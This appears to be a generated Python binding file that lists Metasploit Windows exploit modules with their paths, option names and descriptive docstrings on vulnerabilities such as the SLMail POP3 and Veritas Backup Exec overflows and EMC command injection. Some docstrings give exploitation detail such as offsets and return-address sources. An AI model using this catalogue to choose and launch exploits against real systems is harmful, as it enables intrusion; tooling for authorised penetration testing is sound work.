			required_SRVHOST = 'SRVHOST'
			required_SRVPORT = 'SRVPORT'
			ListenerComm = 'ListenerComm'
			SSLCompression = 'SSLCompression'
			SSLCipher = 'SSLCipher'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			required_URIPATH = 'URIPATH'
			HTTP_chunked = 'HTTP::chunked'
			HTTP_header_folding = 'HTTP::header_folding'
			HTTP_junk_headers = 'HTTP::junk_headers'
			HTTP_compression = 'HTTP::compression'
			required_HTTP_server_name = 'HTTP::server_name'
			URIHOST = 'URIHOST'
			URIPORT = 'URIPORT'
			HTML_unicode = 'HTML::unicode'
			HTML_base64 = 'HTML::base64'
			HTML_javascript_escape = 'HTML::javascript::escape'
			EXE_EICAR = 'EXE::EICAR'
			EXE_Custom = 'EXE::Custom'
			EXE_Path = 'EXE::Path'
			EXE_Template = 'EXE::Template'
			EXE_Inject = 'EXE::Inject'
			EXE_OldMethod = 'EXE::OldMethod'
			EXE_FallBack = 'EXE::FallBack'
			MSI_EICAR = 'MSI::EICAR'
			MSI_Custom = 'MSI::Custom'
			MSI_Path = 'MSI::Path'
			MSI_Template = 'MSI::Template'
			MSI_UAC = 'MSI::UAC'
			required_SHARENAME = 'SHARENAME'
			required_FILENAME = 'FILENAME'

	class windows_misc_windows_rsh(object):
		"""
		
          This module exploits a vulnerabliltiy in Windows RSH daemon 1.8.
        The vulnerability is due to a failure to check for the length of input sent
        to the RSH server. A CPORT of 512 -> 1023 must be configured for the exploit
        to be successful.
      
		"""

		path = 'windows/misc/windows_rsh'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			SSL = 'SSL'
			SSLVersion = 'SSLVersion'
			SSLVerifyMode = 'SSLVerifyMode'
			SSLCipher = 'SSLCipher'
			Proxies = 'Proxies'
			CPORT = 'CPORT'
			CHOST = 'CHOST'
			required_ConnectTimeout = 'ConnectTimeout'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'

	class windows_misc_hp_dataprotector_traversal(object):
		"""
		
        This module exploits a directory traversal vulnerability in the Hewlett-Packard Data
        Protector product. The vulnerability exists in the Backup Client Service (OmniInet.exe)
        and is triggered when parsing packets with opcode 42. This module has been tested
        successfully on HP Data Protector 6.20 on Windows 2003 SP2 and Windows XP SP3.
      
		"""

		path = 'windows/misc/hp_dataprotector_traversal'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			SSL = 'SSL'
			SSLVersion = 'SSLVersion'
			SSLVerifyMode = 'SSLVerifyMode'
			SSLCipher = 'SSLCipher'
			Proxies = 'Proxies'
			CPORT = 'CPORT'
			CHOST = 'CHOST'
			required_ConnectTimeout = 'ConnectTimeout'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			EXE_EICAR = 'EXE::EICAR'
			EXE_Custom = 'EXE::Custom'
			EXE_Path = 'EXE::Path'
			EXE_Template = 'EXE::Template'
			EXE_Inject = 'EXE::Inject'
			EXE_OldMethod = 'EXE::OldMethod'
			EXE_FallBack = 'EXE::FallBack'
			MSI_EICAR = 'MSI::EICAR'
			MSI_Custom = 'MSI::Custom'
			MSI_Path = 'MSI::Path'
			MSI_Template = 'MSI::Template'
			MSI_UAC = 'MSI::UAC'
			FileDropperDelay = 'FileDropperDelay'

	class windows_misc_eiqnetworks_esa_topology(object):
		"""
		
          This module exploits a stack buffer overflow in eIQnetworks
        Enterprise Security Analyzer. During the processing of
        long arguments to the DELETEDEVICE command in the Topology
        server, a stack-based buffer overflow occurs.

        This module has only been tested against ESA v2.1.13.
      
		"""

		path = 'windows/misc/eiqnetworks_esa_topology'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			SSL = 'SSL'
			SSLVersion = 'SSLVersion'
			SSLVerifyMode = 'SSLVerifyMode'
			SSLCipher = 'SSLCipher'
			Proxies = 'Proxies'
			CPORT = 'CPORT'
			CHOST = 'CHOST'
			required_ConnectTimeout = 'ConnectTimeout'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'

	class windows_misc_solidworks_workgroup_pdmwservice_file_write(object):
		"""
		
        This module exploits a remote arbitrary file write vulnerability in
        SolidWorks Workgroup PDM 2014 SP2 and prior.

        For targets running Windows Vista or newer the payload is written to the
        startup folder for all users and executed upon next user logon.

        For targets before Windows Vista code execution can be achieved by first
        uploading the payload as an exe file, and then upload another mof file,
        which schedules WMI to execute the uploaded payload.

        This module has been tested successfully on SolidWorks Workgroup PDM
        2011 SP0 on Windows XP SP3 (EN) and Windows 7 SP1 (EN).
      
		"""

		path = 'windows/misc/solidworks_workgroup_pdmwservice_file_write'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			SSL = 'SSL'
			SSLVersion = 'SSLVersion'
			SSLVerifyMode = 'SSLVerifyMode'
			SSLCipher = 'SSLCipher'
			Proxies = 'Proxies'
			CPORT = 'CPORT'
			CHOST = 'CHOST'
			required_ConnectTimeout = 'ConnectTimeout'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			EXE_EICAR = 'EXE::EICAR'
			EXE_Custom = 'EXE::Custom'
			EXE_Path = 'EXE::Path'
			EXE_Template = 'EXE::Template'
			EXE_Inject = 'EXE::Inject'
			EXE_OldMethod = 'EXE::OldMethod'
			EXE_FallBack = 'EXE::FallBack'
			MSI_EICAR = 'MSI::EICAR'
			MSI_Custom = 'MSI::Custom'
			MSI_Path = 'MSI::Path'
			MSI_Template = 'MSI::Template'
			MSI_UAC = 'MSI::UAC'
			FileDropperDelay = 'FileDropperDelay'
			required_DEPTH = 'DEPTH'

	class windows_misc_talkative_response(object):
		"""
		
          This module exploits a stack buffer overflow in Talkative IRC v0.4.4.16.
        When a specially crafted response string is sent to a client,
        an attacker may be able to execute arbitrary code.
      
		"""

		path = 'windows/misc/talkative_response'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			SSL = 'SSL'
			SSLCert = 'SSLCert'
			required_SRVHOST = 'SRVHOST'
			required_SRVPORT = 'SRVPORT'
			ListenerComm = 'ListenerComm'
			SSLCompression = 'SSLCompression'
			SSLCipher = 'SSLCipher'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'

	class windows_email_ms10_045_outlook_ref_resolve(object):
		"""
		
        It has been discovered that certain e-mail message cause Outlook to create Windows
        shortcut-like attachments or messages within Outlook. Through specially crafted TNEF
        streams with certain MAPI attachment properties, it is possible to set a path name
        to files to be executed. When a user double clicks on such an attachment or message,
        Outlook will proceed to execute the file that is set by the path name value. These
        files can be local files, but also file stored remotely for example on a file share.
        Exploitation is limited by the fact that its is not possible for attackers to supply
        command line options.
      
		"""

		path = 'windows/email/ms10_045_outlook_ref_resolve'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			SSLCert = 'SSLCert'
			required_SRVHOST = 'SRVHOST'
			required_SRVPORT = 'SRVPORT'
			ListenerComm = 'ListenerComm'
			SSLCompression = 'SSLCompression'
			SSLCipher = 'SSLCipher'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			required_URIPATH = 'URIPATH'
			HTTP_chunked = 'HTTP::chunked'
			HTTP_header_folding = 'HTTP::header_folding'
			HTTP_junk_headers = 'HTTP::junk_headers'
			HTTP_compression = 'HTTP::compression'
			required_HTTP_server_name = 'HTTP::server_name'
			URIHOST = 'URIHOST'
			URIPORT = 'URIPORT'
			HTML_unicode = 'HTML::unicode'
			HTML_base64 = 'HTML::base64'
			HTML_javascript_escape = 'HTML::javascript::escape'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			SSLVerifyMode = 'SSLVerifyMode'
			Proxies = 'Proxies'
			CPORT = 'CPORT'
			CHOST = 'CHOST'
			required_ConnectTimeout = 'ConnectTimeout'
			DATE = 'DATE'
			required_MAILFROM = 'MAILFROM'
			required_MAILTO = 'MAILTO'
			required_SUBJECT = 'SUBJECT'
			USERNAME = 'USERNAME'
			PASSWORD = 'PASSWORD'
			DOMAIN = 'DOMAIN'
			EXE_EICAR = 'EXE::EICAR'
			EXE_Custom = 'EXE::Custom'
			EXE_Path = 'EXE::Path'
			EXE_Template = 'EXE::Template'
			EXE_Inject = 'EXE::Inject'
			EXE_OldMethod = 'EXE::OldMethod'
			EXE_FallBack = 'EXE::FallBack'
			MSI_EICAR = 'MSI::EICAR'
			MSI_Custom = 'MSI::Custom'
			MSI_Path = 'MSI::Path'
			MSI_Template = 'MSI::Template'
			MSI_UAC = 'MSI::UAC'
			MESSAGECLASS = 'MESSAGECLASS'
			EXTENSION = 'EXTENSION'
			UNCHOST = 'UNCHOST'

	class windows_email_ms07_017_ani_loadimage_chunksize(object):
		"""
		
        This module exploits a buffer overflow vulnerability in the
        LoadAniIcon() function of USER32.dll. The flaw is triggered
        through Outlook Express by using the CURSOR style sheet
        directive to load a malicious .ANI file.

        This vulnerability was discovered by Alexander Sotirov of Determina
        and was rediscovered, in the wild, by McAfee.
      
		"""

		path = 'windows/email/ms07_017_ani_loadimage_chunksize'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			SSL = 'SSL'
			SSLVersion = 'SSLVersion'
			SSLVerifyMode = 'SSLVerifyMode'
			SSLCipher = 'SSLCipher'
			Proxies = 'Proxies'
			CPORT = 'CPORT'
			CHOST = 'CHOST'
			required_ConnectTimeout = 'ConnectTimeout'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			DATE = 'DATE'
			required_MAILFROM = 'MAILFROM'
			required_MAILTO = 'MAILTO'
			required_SUBJECT = 'SUBJECT'
			USERNAME = 'USERNAME'
			PASSWORD = 'PASSWORD'
			DOMAIN = 'DOMAIN'

	class windows_email_ms10_045_outlook_ref_only(object):
		"""
		
        It has been discovered that certain e-mail message cause Outlook to create Windows
        shortcut-like attachments or messages within Outlook. Through specially crafted TNEF
        streams with certain MAPI attachment properties, it is possible to set a path name
        to files to be executed. When a user double clicks on such an attachment or message,
        Outlook will proceed to execute the file that is set by the path name value. These
        files can be local files, but also file stored remotely for example on a file share.
        Exploitation is limited by the fact that its is not possible for attackers to supply
        command line options.
      
		"""

		path = 'windows/email/ms10_045_outlook_ref_only'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			SSLCert = 'SSLCert'
			required_SRVHOST = 'SRVHOST'
			required_SRVPORT = 'SRVPORT'
			ListenerComm = 'ListenerComm'
			SSLCompression = 'SSLCompression'
			SSLCipher = 'SSLCipher'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			required_URIPATH = 'URIPATH'
			HTTP_chunked = 'HTTP::chunked'
			HTTP_header_folding = 'HTTP::header_folding'
			HTTP_junk_headers = 'HTTP::junk_headers'
			HTTP_compression = 'HTTP::compression'
			required_HTTP_server_name = 'HTTP::server_name'
			URIHOST = 'URIHOST'
			URIPORT = 'URIPORT'
			HTML_unicode = 'HTML::unicode'
			HTML_base64 = 'HTML::base64'
			HTML_javascript_escape = 'HTML::javascript::escape'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			SSLVerifyMode = 'SSLVerifyMode'
			Proxies = 'Proxies'
			CPORT = 'CPORT'
			CHOST = 'CHOST'
			required_ConnectTimeout = 'ConnectTimeout'
			DATE = 'DATE'
			required_MAILFROM = 'MAILFROM'
			required_MAILTO = 'MAILTO'
			required_SUBJECT = 'SUBJECT'
			USERNAME = 'USERNAME'
			PASSWORD = 'PASSWORD'
			DOMAIN = 'DOMAIN'
			EXE_EICAR = 'EXE::EICAR'
			EXE_Custom = 'EXE::Custom'
			EXE_Path = 'EXE::Path'
			EXE_Template = 'EXE::Template'
			EXE_Inject = 'EXE::Inject'
			EXE_OldMethod = 'EXE::OldMethod'
			EXE_FallBack = 'EXE::FallBack'
			MSI_EICAR = 'MSI::EICAR'
			MSI_Custom = 'MSI::Custom'
			MSI_Path = 'MSI::Path'
			MSI_Template = 'MSI::Template'
			MSI_UAC = 'MSI::UAC'
			MESSAGECLASS = 'MESSAGECLASS'
			FILENAME = 'FILENAME'
			HTML = 'HTML'
			MESSAGE = 'MESSAGE'
			UNCHOST = 'UNCHOST'

	class windows_wins_ms04_045_wins(object):
		"""
		
        This module exploits an arbitrary memory write flaw in the
        WINS service. This exploit has been tested against Windows
        2000 only.

      
		"""

		path = 'windows/wins/ms04_045_wins'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			SSL = 'SSL'
			SSLVersion = 'SSLVersion'
			SSLVerifyMode = 'SSLVerifyMode'
			SSLCipher = 'SSLCipher'
			Proxies = 'Proxies'
			CPORT = 'CPORT'
			CHOST = 'CHOST'
			required_ConnectTimeout = 'ConnectTimeout'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'

	class windows_arkeia_type77(object):
		"""
		
          This module exploits a stack buffer overflow in the Arkeia backup
        client for the Windows platform. This vulnerability affects
        all versions up to and including 5.3.3.
      
		"""

		path = 'windows/arkeia/type77'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			SSL = 'SSL'
			SSLVersion = 'SSLVersion'
			SSLVerifyMode = 'SSLVerifyMode'
			SSLCipher = 'SSLCipher'
			Proxies = 'Proxies'
			CPORT = 'CPORT'
			CHOST = 'CHOST'
			required_ConnectTimeout = 'ConnectTimeout'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			DynamicSehRecord = 'DynamicSehRecord'

	class windows_pop3_seattlelab_pass(object):
		"""
		
          There exists an unauthenticated buffer overflow vulnerability
        in the POP3 server of Seattle Lab Mail 5.5 when sending a password
        with excessive length.

        Successful exploitation should not crash either the
        service or the server; however, after initial use the
        port cannot be reused for successive exploitation until
        the service has been restarted. Consider using a command
        execution payload following the bind shell to restart
        the service if you need to reuse the same port.

        The overflow appears to occur in the debugging/error reporting
        section of the slmail.exe executable, and there are multiple
        offsets that will lead to successful exploitation. This exploit
        uses 2606, the offset that creates the smallest overall payload.
        The other offset is 4654.

        The return address is overwritten with a "jmp esp" call from the
        application library SLMFC.DLL found in %SYSTEM%/system32/. This
        return address works against all version of Windows and service packs.

        The last modification date on the library is dated 06/02/99. Assuming
        that the code where the overflow occurs has not changed in some time,
        prior version of SLMail may also be vulnerable with this exploit. The
        author has not been able to acquire older versions of SLMail for
        testing purposes. Please let us know if you were able to get this
        exploit working against other SLMail versions.
      
		"""

		path = 'windows/pop3/seattlelab_pass'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			SSL = 'SSL'
			SSLVersion = 'SSLVersion'
			SSLVerifyMode = 'SSLVerifyMode'
			SSLCipher = 'SSLCipher'
			Proxies = 'Proxies'
			CPORT = 'CPORT'
			CHOST = 'CHOST'
			required_ConnectTimeout = 'ConnectTimeout'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'

	class windows_backupexec_name_service(object):
		"""
		
          This module exploits a vulnerability in the Veritas Backup
        Exec Agent Browser service. This vulnerability occurs when a
        recv() call has a length value too long for the	destination
        stack buffer. By sending an agent name value of 63 bytes or
        more, we can overwrite the return address of the recv
        function. Since we only have ~60 bytes of contiguous space
        for shellcode, a tiny findsock payload is sent which uses a
        hardcoded IAT address for the recv() function. This payload
        will then roll the stack back to the beginning of the page,
        recv() the real shellcode into it, and jump to it. This
        module has been tested against Veritas 9.1 SP0, 9.1 SP1, and
        8.6.
      
		"""

		path = 'windows/backupexec/name_service'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			SSL = 'SSL'
			SSLVersion = 'SSLVersion'
			SSLVerifyMode = 'SSLVerifyMode'
			SSLCipher = 'SSLCipher'
			Proxies = 'Proxies'
			CPORT = 'CPORT'
			CHOST = 'CHOST'
			required_ConnectTimeout = 'ConnectTimeout'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'

	class windows_backupexec_remote_agent(object):
		"""
		
          This module exploits a stack buffer overflow in the Veritas
        BackupExec Windows Agent software. This vulnerability occurs
        when a client authentication request is received with type
        '3' and a long password argument. Reliable execution is
        obtained by abusing the stack buffer overflow to smash a SEH
        pointer.
      
		"""

		path = 'windows/backupexec/remote_agent'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			SSL = 'SSL'
			SSLVersion = 'SSLVersion'
			SSLVerifyMode = 'SSLVerifyMode'
			SSLCipher = 'SSLCipher'
			Proxies = 'Proxies'
			CPORT = 'CPORT'
			CHOST = 'CHOST'
			required_ConnectTimeout = 'ConnectTimeout'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'

	class windows_emc_replication_manager_exec(object):
		"""
		
        This module exploits a remote command-injection vulnerability in EMC Replication Manager
        client (irccd.exe). By sending a specially crafted message invoking RunProgram function an
        attacker may be able to execute arbitrary commands with SYSTEM privileges. Affected
        products are EMC Replication Manager < 5.3. This module has been successfully tested
        against EMC Replication Manager 5.2.1 on XP/W2003. EMC Networker Module for Microsoft
        Applications 2.1 and 2.2 may be vulnerable too although this module have not been tested
        against these products.
      
		"""

		path = 'windows/emc/replication_manager_exec'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			SSL = 'SSL'
			SSLVersion = 'SSLVersion'
			SSLVerifyMode = 'SSLVerifyMode'
			SSLCipher = 'SSLCipher'
			Proxies = 'Proxies'
			CPORT = 'CPORT'
			CHOST = 'CHOST'
			required_ConnectTimeout = 'ConnectTimeout'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			EXE_EICAR = 'EXE::EICAR'
			EXE_Custom = 'EXE::Custom'
			EXE_Path = 'EXE::Path'
			EXE_Template = 'EXE::Template'
			EXE_Inject = 'EXE::Inject'
			EXE_OldMethod = 'EXE::OldMethod'
			EXE_FallBack = 'EXE::FallBack'
			MSI_EICAR = 'MSI::EICAR'
			MSI_Custom = 'MSI::Custom'
			MSI_Path = 'MSI::Path'
			MSI_Template = 'MSI::Template'
			MSI_UAC = 'MSI::UAC'
			SSLCert = 'SSLCert'
			required_SRVHOST = 'SRVHOST'
			required_SRVPORT = 'SRVPORT'
			ListenerComm = 'ListenerComm'
			SSLCompression = 'SSLCompression'
			URIPATH = 'URIPATH'
			HTTP_chunked = 'HTTP::chunked'
			HTTP_header_folding = 'HTTP::header_folding'
			HTTP_junk_headers = 'HTTP::junk_headers'
			HTTP_compression = 'HTTP::compression'
			required_HTTP_server_name = 'HTTP::server_name'
			URIHOST = 'URIHOST'
			URIPORT = 'URIPORT'
			CMDSTAGER_FLAVOR = 'CMDSTAGER::FLAVOR'
			CMDSTAGER_DECODER = 'CMDSTAGER::DECODER'

	class windows_emc_alphastor_agent(object):
		"""
		
          This module exploits a stack buffer overflow in EMC AlphaStor 3.1.
        By sending a specially crafted message, an attacker may
        be able to execute arbitrary code.
      
		"""

		path = 'windows/emc/alphastor_agent'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			SSL = 'SSL'
			SSLVersion = 'SSLVersion'
			SSLVerifyMode = 'SSLVerifyMode'
			SSLCipher = 'SSLCipher'
			Proxies = 'Proxies'
			CPORT = 'CPORT'
			CHOST = 'CHOST'
			required_ConnectTimeout = 'ConnectTimeout'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'

	class windows_emc_networker_format_string(object):
		"""
		
          This module exploits a format string vulnerability in the lg_sprintf function
        as implemented in liblocal.dll on EMC Networker products. This module exploits the
        vulnerability by using a specially crafted RPC call to the program number 0x5F3DD,
        version 0x02, and procedure 0x06. This module has been tested successfully on EMC
        Networker 7.6 SP3 on Windows XP SP3 and Windows 2003 SP2 (DEP bypass).
      
		"""

		path = 'windows/emc/networker_format_string'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			SSL = 'SSL'
			SSLVersion = 'SSLVersion'
			SSLVerifyMode = 'SSLVerifyMode'
			SSLCipher = 'SSLCipher'
			Proxies = 'Proxies'
			CPORT = 'CPORT'
			CHOST = 'CHOST'
			required_ConnectTimeout = 'ConnectTimeout'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			ONCRPC_tcp_request_fragmentation = 'ONCRPC::tcp_request_fragmentation'
			required_TIMEOUT = 'TIMEOUT'

	class windows_emc_alphastor_device_manager_exec(object):
		"""
		
        This module exploits a flaw within the Device Manager (rrobtd.exe). When parsing the 0x75
        command, the process does not properly filter user supplied input allowing for arbitrary
        command injection. This module has been tested successfully on EMC AlphaStor 4.0 build 116
        with Windows 2003 SP2 and Windows 2008 R2.
      
		"""

		path = 'windows/emc/alphastor_device_manager_exec'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			SSL = 'SSL'
			SSLVersion = 'SSLVersion'
			SSLVerifyMode = 'SSLVerifyMode'
			SSLCipher = 'SSLCipher'
			Proxies = 'Proxies'
			CPORT = 'CPORT'
			CHOST = 'CHOST'
			required_ConnectTimeout = 'ConnectTimeout'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			EXE_EICAR = 'EXE::EICAR'
			EXE_Custom = 'EXE::Custom'
			EXE_Path = 'EXE::Path'
			EXE_Template = 'EXE::Template'
			EXE_Inject = 'EXE::Inject'
			EXE_OldMethod = 'EXE::OldMethod'
			EXE_FallBack = 'EXE::FallBack'
			MSI_EICAR = 'MSI::EICAR'
			MSI_Custom = 'MSI::Custom'
			MSI_Path = 'MSI::Path'
			MSI_Template = 'MSI::Template'
			MSI_UAC = 'MSI::UAC'
			SSLCert = 'SSLCert'
			required_SRVHOST = 'SRVHOST'
			required_SRVPORT = 'SRVPORT'
			ListenerComm = 'ListenerComm'
			SSLCompression = 'SSLCompression'
			URIPATH = 'URIPATH'
			HTTP_chunked = 'HTTP::chunked'
			HTTP_header_folding = 'HTTP::header_folding'
			HTTP_junk_headers = 'HTTP::junk_headers'
			HTTP_compression = 'HTTP::compression'
			required_HTTP_server_name = 'HTTP::server_name'
			URIHOST = 'URIHOST'
			URIPORT = 'URIPORT'
			CMDSTAGER_FLAVOR = 'CMDSTAGER::FLAVOR'
			CMDSTAGER_DECODER = 'CMDSTAGER::DECODER'

	class windows_postgres_postgres_payload(object):
		"""
		
        On default Microsoft Windows installations of PostgreSQL the postgres
        service account may write to the current directory (which is usually
        "C:/Program Files/PostgreSQL/<version>/data" where <version> is the
        major.minor version of PostgreSQL). UDF DLL's may be sourced from
        there as well.

        This module uploads a Windows DLL file via the pg_largeobject method
        of binary injection and creates a UDF (user defined function) from
        that DLL. Because the payload is run from DllMain, it does not need to
        conform to specific Postgres API versions.
      
		"""

		path = 'windows/postgres/postgres_payload'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			required_DATABASE = 'DATABASE'
			required_USERNAME = 'USERNAME'
			PASSWORD = 'PASSWORD'
			EXE_EICAR = 'EXE::EICAR'
			EXE_Custom = 'EXE::Custom'
			EXE_Path = 'EXE::Path'
			EXE_Template = 'EXE::Template'
			EXE_Inject = 'EXE::Inject'
			EXE_OldMethod = 'EXE::OldMethod'
			EXE_FallBack = 'EXE::FallBack'
			MSI_EICAR = 'MSI::EICAR'
			MSI_Custom = 'MSI::Custom'
			MSI_Path = 'MSI::Path'
			MSI_Template = 'MSI::Template'
			MSI_UAC = 'MSI::UAC'
			FileDropperDelay = 'FileDropperDelay'

	class windows_isapi_ms00_094_pbserver(object):
		"""
		
          This is an exploit for the Phone Book Service /pbserver/pbserver.dll
        described in MS00-094. By sending an overly long URL argument
        for phone book updates, it is possible to overwrite the stack. This
        module has only been tested against Windows 2000 SP1.
      
		"""

		path = 'windows/isapi/ms00_094_pbserver'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			VHOST = 'VHOST'
			SSL = 'SSL'
			Proxies = 'Proxies'
			UserAgent = 'UserAgent'
			HttpUsername = 'HttpUsername'
			HttpPassword = 'HttpPassword'
			DigestAuthIIS = 'DigestAuthIIS'
			SSLVersion = 'SSLVersion'
			FingerprintCheck = 'FingerprintCheck'
			required_DOMAIN = 'DOMAIN'
			HttpClientTimeout = 'HttpClientTimeout'
			HttpTrace = 'HttpTrace'
			HTTP_uri_encode_mode = 'HTTP::uri_encode_mode'
			HTTP_uri_full_url = 'HTTP::uri_full_url'
			HTTP_pad_method_uri_count = 'HTTP::pad_method_uri_count'
			HTTP_pad_uri_version_count = 'HTTP::pad_uri_version_count'
			HTTP_pad_method_uri_type = 'HTTP::pad_method_uri_type'
			HTTP_pad_uri_version_type = 'HTTP::pad_uri_version_type'
			HTTP_method_random_valid = 'HTTP::method_random_valid'
			HTTP_method_random_invalid = 'HTTP::method_random_invalid'
			HTTP_method_random_case = 'HTTP::method_random_case'
			HTTP_version_random_valid = 'HTTP::version_random_valid'
			HTTP_version_random_invalid = 'HTTP::version_random_invalid'
